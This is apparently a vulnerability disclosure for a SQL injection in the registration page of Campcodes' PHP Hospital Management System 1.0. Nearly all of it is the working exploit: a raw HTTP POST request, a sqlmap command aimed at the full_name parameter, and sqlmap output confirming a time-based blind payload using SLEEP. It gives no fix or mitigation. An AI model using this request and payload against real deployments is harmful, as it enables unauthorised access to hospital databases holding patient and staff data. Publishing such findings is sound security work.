# Hospital Management System sqli in /hms/admin/registration.php

- Vendor Homepage: https://www.campcodes.com
- Software Link: https://www.campcodes.com/projects/online-hospital-management-system-using-php-and-mysql/
- Version: 1.0

### POC

#### request.txt

```http
POST /hospital/hms/admin/registration.php HTTP/1.1
Host: 192.168.177.1
Referer: http://192.168.177.1/hospital/hms/admin/registration.php
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0, i
Cookie: clip-setting=%7B%22fixedHeader%22%3Atrue%2C%22fixedSidebar%22%3Atrue%2C%22closedSidebar%22%3Afalse%2C%22fixedFooter%22%3Afalse%2C%22theme%22%3A%22theme-1%22%7D; PHPSESSID=b4ao6mmdbco1bcmr84grm25ihd
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.177.1
Content-Length: 124

full_name=admin&address=admin&city=admin&gender=female&email=admin%40admin.com&password=123456&password_again=123456&submit=
```

```
sqlmap -r request.txt -p full_name --technique T --batch --flush-session --level 5
```

![image-20250530164908643](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505301649739.png)

```
---
Parameter: full_name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: full_name=test'+(SELECT 0x6f626a70 WHERE 9939=9939 AND (SELECT 4907 FROM (SELECT(SLEEP(5)))VjxU))+'&address=test&city=test&gender=female&email=test@test.com&password=123456&password_again=123456&submit=
---
```

